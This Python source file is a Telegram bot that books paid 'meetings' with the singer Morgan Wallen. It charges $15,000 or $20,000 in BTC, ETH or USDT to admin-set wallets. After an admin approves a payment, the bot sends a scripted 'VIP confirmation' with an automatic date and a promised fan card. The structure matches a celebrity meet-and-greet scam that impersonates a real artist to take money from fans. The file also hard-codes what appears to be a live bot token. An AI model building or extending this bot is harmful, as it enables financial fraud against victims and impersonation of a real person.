from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import sqlite3
from datetime import datetime, timedelta

# ================= TOKEN =================
TOKEN = "8681446523:AAHs42JckBFG_n-OYsASEbv-6Q4eFUlE5tw"

# ================= ADMIN =================
ADMIN_IDS = [7936558915]

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ================= DATABASE =================
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS bookings (
    user_id INTEGER,
    meeting_type TEXT,
    reason TEXT,
    price INTEGER,
    status TEXT,
    meeting_date TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS wallets (
    coin TEXT PRIMARY KEY,
    address TEXT
)
""")

conn.commit()

# ================= WALLET =================
def get_wallet(coin):
    cursor.execute("SELECT address FROM wallets WHERE coin=?", (coin,))
    row = cursor.fetchone()
    return row[0] if row else "NOT SET"

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🎯 Book Meeting", callback_data="book")]]

    if is_admin(update.effective_user.id):
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])

    await update.message.reply_text("Welcome 👋", reply_markup=InlineKeyboardMarkup(keyboard))

# ================= CALLBACK =================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # ================= COPY WALLET =================
    if data.startswith("copy_"):
        wallet = data.replace("copy_", "")
        await query.answer(text="Tap and hold to copy ✅", show_alert=True)
        await query.message.reply_text(wallet)
        return

    # ================= GUIDE (UNCHANGED) =================
    if data.startswith("guide_"):
        coin = data.split("_")[1]

        guide_text = f"""
📘 Crypto Payment Guide ({coin})

━━━━━━━━━━━━━━━━━━
STEP-BY-STEP
━━━━━━━━━━━━━━━━━━

1️⃣ Open your crypto wallet  
2️⃣ Select "Send" or "Withdraw"  
3️⃣ Choose the exact coin/network: {coin}  
4️⃣ Paste the wallet address  
5️⃣ Enter the exact amount  
6️⃣ Review all details carefully  
7️⃣ Confirm and send payment  

━━━━━━━━━━━━━━━━━━
⚠️ IMPORTANT
━━━━━━━━━━━━━━━━━━
• Always select the correct coin/network ({coin})  
• Avoid wrong networks  
• Ensure wallet address is correct  
• Send exact amount  

After payment, return and confirm.
"""
        await query.message.reply_text(guide_text)
        return

    # ================= ADMIN PANEL =================
    if data == "admin_panel":
        if not is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized")
            return

        await query.edit_message_text("🛠 Admin Panel")
        return

    # ================= BOOK =================
    if data == "book":
        keyboard = [
            [InlineKeyboardButton("Meet & Greet", callback_data="type_meet")],
            [InlineKeyboardButton("Business", callback_data="type_business")]
        ]
        await query.edit_message_text("Choose meeting type:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data in ["type_meet", "type_business"]:
        meeting_type = "Meet & Greet" if data == "type_meet" else "Business"
        context.user_data["meeting_type"] = meeting_type
        context.user_data["step"] = "reason"
        await query.edit_message_text("Send your reason for the meeting:")

    # ================= PAYMENT =================
    elif data.startswith("pay_"):
        coin = data.split("_")[1]
        wallet = get_wallet(coin)

        meeting_type = context.user_data.get("meeting_type", "Meet & Greet")
        price = 15000 if meeting_type == "Meet & Greet" else 20000

        keyboard = [
            [InlineKeyboardButton("📋 Copy Wallet", callback_data=f"copy_{wallet}")],
            [InlineKeyboardButton("📘 Payment Guide", callback_data=f"guide_{coin}")],
            [InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_payment")]
        ]

        await query.message.reply_text(
            f"🧾 Invoice\n\n"
            f"Meeting Type: {meeting_type}\n"
            f"Amount: ${price}\n"
            f"Coin: {coin}\n\n"
            f"📥 Wallet:\n{wallet}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ================= CONFIRM =================
    elif data == "confirm_payment":
        meeting_type = context.user_data.get("meeting_type", "Meet & Greet")
        price = 15000 if meeting_type == "Meet & Greet" else 20000

        for admin_id in ADMIN_IDS:
            await context.bot.send_message(
                chat_id=admin_id,
                text=(
                    f"🧾 Payment Pending Approval\n\n"
                    f"User ID: {user_id}\n"
                    f"Meeting Type: {meeting_type}\n"
                    f"Amount: ${price}"
                ),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")],
                    [InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")]
                ])
            )

        await query.edit_message_text("⏳ Awaiting admin approval...")

    # ================= APPROVE =================
    elif data.startswith("approve_"):
        if not is_admin(user_id):
            return

        target_user = int(data.split("_")[1])
        meeting_date = datetime.now() + timedelta(days=5)

        await context.bot.send_message(
            chat_id=target_user,
            text=(
                "🎉 Payment Confirmed Successfully\n\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "👑 VIP CONFIRMATION NOTICE\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                "Dear User,\n\n"
                "Your payment has been successfully verified and approved by the administration.\n\n"
                "📅 Your meeting with Morgan Wallen has been scheduled as follows:\n"
                f"{meeting_date.strftime('%Y-%m-%d %H:%M')}\n\n"
                "🎫 A VIP Fan Recognition Card will be issued and shipped to you within the next 2 days prior to your scheduled meeting.\n\n"
                "📌 This fan card will serve as your official form of recognition and identification during the meeting process.\n\n"
                "📦 Shipping details will be requested when your fan card is ready.\n\n"
                "Please ensure you are available on the scheduled date and maintain active contact for any further coordination.\n\n"
                "We appreciate your trust and look forward to delivering a premium experience.\n\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Status: CONFIRMED ✅"
            )
        )

        await query.edit_message_text("✅ Approved")

    # ================= REJECT =================
    elif data.startswith("reject_"):
        target_user = int(data.split("_")[1])
        await context.bot.send_message(target_user, "❌ Payment rejected.")
        await query.edit_message_text("❌ Rejected")

# ================= TEXT =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if context.user_data.get("step") == "reason":
        meeting_type = context.user_data.get("meeting_type")
        price = 15000 if meeting_type == "Meet & Greet" else 20000

        cursor.execute("""
        INSERT INTO bookings (user_id, meeting_type, reason, price, status, meeting_date)
        VALUES (?, ?, ?, ?, ?, ?)
        """, (update.effective_user.id, meeting_type, text, price, "pending", None))

        conn.commit()

        context.user_data["step"] = None

        keyboard = [
            [InlineKeyboardButton("BTC", callback_data="pay_BTC")],
            [InlineKeyboardButton("ETH", callback_data="pay_ETH")],
            [InlineKeyboardButton("USDT", callback_data="pay_USDT")]
        ]

        await update.message.reply_text(
            f"Amount: ${price}\nChoose payment method:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# ================= RUN =================
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(buttons))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

print("Bot running...")
app.run_polling()